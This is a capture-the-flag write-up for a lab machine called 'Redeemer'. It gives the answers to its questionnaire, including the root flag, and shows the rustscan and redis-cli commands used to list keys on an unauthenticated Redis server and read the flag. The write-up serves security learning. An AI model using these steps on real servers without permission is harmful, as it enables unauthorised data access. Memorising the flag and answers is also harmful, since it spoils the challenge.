# Redeemer

## Questionnaire

##### Which TCP port is open on the machine?

```
6379
```

##### Which service is running on the port that is open on the machine?

```
redis
```

##### What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database

```
In-memory Database
```

##### Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.

```
redis-cli
```

##### Which flag is used with the Redis command-line utility to specify the hostname?

```
-h
```

##### Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?

```
info
```

##### What is the version of the Redis server being used on the target machine?

```
5.0.7
```

##### Which command is used to select the desired database in Redis?

```
select
```

##### How many keys are present inside the database with index 0?

```
4
```

##### Which command is used to obtain all the keys in a database?

```
keys *
```

##### Submit root flag

```
03e1d2b376c37ab3f5319922053953eb
```

## Commands

### Scan

```
$ rustscan -a 10.129.70.165

PORT     STATE SERVICE REASON
6379/tcp open  redis   syn-ack
```

### Version

```
$ redis-cli -h 10.129.70.165 info | grep redis_version

redis_version:5.0.7
```

### Keys

```
$ redis-cli -h 10.129.70.165 -n 0 keys '*'

1) "numb"
2) "flag"
3) "temp"
4) "stor"
```

### Flag

```
$ redis-cli -h 10.129.70.165 -n 0 get flag

"03e1d2b376c37ab3f5319922053953eb"
```
